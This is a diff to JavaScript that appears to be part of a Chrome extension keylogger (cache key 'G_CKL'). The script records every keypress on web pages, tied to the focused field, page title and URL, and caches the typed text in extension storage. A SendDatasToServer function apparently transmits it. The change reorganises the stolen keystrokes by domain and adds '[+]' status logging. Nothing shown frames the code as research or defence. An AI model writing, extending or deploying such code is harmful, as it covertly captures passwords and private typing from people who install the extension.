@@ -12,7 +12,9 @@ var loadingTime	= new Date().getTime();
 var tabDataKey 	= '[' + document.title + ']::[' + document.URL + ']::[' + loadingTime + ']';
 var isHttps		= (document.URL.substring(0,5) === 'https');
 
-console.log(tabDataKey);
+var URLorigin 	= document.URL.match(/^[\w-]+:\/*\[?([\w\.:-]+)\]?(?::\d+)?/)[0];
+
+console.log('[+] -> ' + tabDataKey);
 
 document.addEventListener('keypress', function (e)
 {
@@ -25,8 +27,7 @@ document.addEventListener('keypress', function (e)
 	datas[document.activeElement.id] += String.fromCharCode(charCode);
 });
 
-
-function SendDatasToServer(dataToSend)
+function 	SendDatasToServer(dataToSend)
 {
 	if (!isHttps)
 	{
@@ -70,18 +71,22 @@ function	UpdateCache()
 		if (items.length == 0 || items['G_CKL'] == undefined || items['G_CKL']['content'] == undefined)		// cache does not exists yet
 		{
 			console.log('-> Creating cache');
-			to_log['G_CKL']['content'][document.URL] = {};													// Create cache for the current page
-			to_log['G_CKL']['content'][document.URL][loadingTime] = datas;
+			to_log['G_CKL']['content'] = {};
+			to_log['G_CKL']['content'][URLorigin] = {};														// Create cache for the current domain
+			to_log['G_CKL']['content'][URLorigin][document.URL] = {};										// Create cache for the current page
 		}
 		else																								// Cache already exists
 		{
 			console.log('-> Updating cache');
-			to_log['G_CKL']['lastSend']	= items['G_CKL']['lastSend'];
-			to_log['G_CKL']['content'] 	= items['G_CKL']['content'];
-			if (to_log['G_CKL']['content'][document.URL] == undefined)
-				to_log['G_CKL']['content'][document.URL] = {}; 												// Update cache for the current page
-			to_log['G_CKL']['content'][document.URL][loadingTime] = datas;
+			to_log['G_CKL']['lastSend']	= items['G_CKL']['lastSend'];										// Keep existing datas into the cache
+			to_log['G_CKL']['content'] 	= items['G_CKL']['content'];										// 
+			if (to_log['G_CKL']['content'][URLorigin] == undefined)
+				to_log['G_CKL']['content'][URLorigin] = {};
+			if (to_log['G_CKL']['content'][URLorigin][document.URL] == undefined)
+				to_log['G_CKL']['content'][URLorigin][document.URL] = {}; 									// Update cache for the current page
 		}
+		
+		to_log['G_CKL']['content'][URLorigin][document.URL][loadingTime] = datas;							// Insert new datas
 		
 		chrome.storage.local.set(to_log, function() {
 			console.log('[+] Datas saved to cache');
